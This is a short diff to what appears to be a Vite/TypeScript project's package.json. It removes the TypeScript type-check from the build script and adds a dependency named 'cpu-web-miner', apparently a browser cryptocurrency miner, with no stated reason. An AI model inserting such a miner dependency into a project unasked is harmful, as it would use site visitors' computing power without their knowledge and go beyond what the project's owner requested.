@@ -5,11 +5,12 @@
   "type": "module",
   "scripts": {
     "dev": "vite",
-    "build": "tsc -b && vite build",
+    "build": "vite build",
     "lint": "eslint . --ext ts,tsx --report-unused-disable-directives --max-warnings 0",
     "preview": "vite preview"
   },
   "dependencies": {
+    "@marco_ciaramella/cpu-web-miner": "^1.1.6",
     "autoprefixer": "^10.4.19",
     "framer-motion": "^11.3.19",
     "postcss": "^8.4.40",
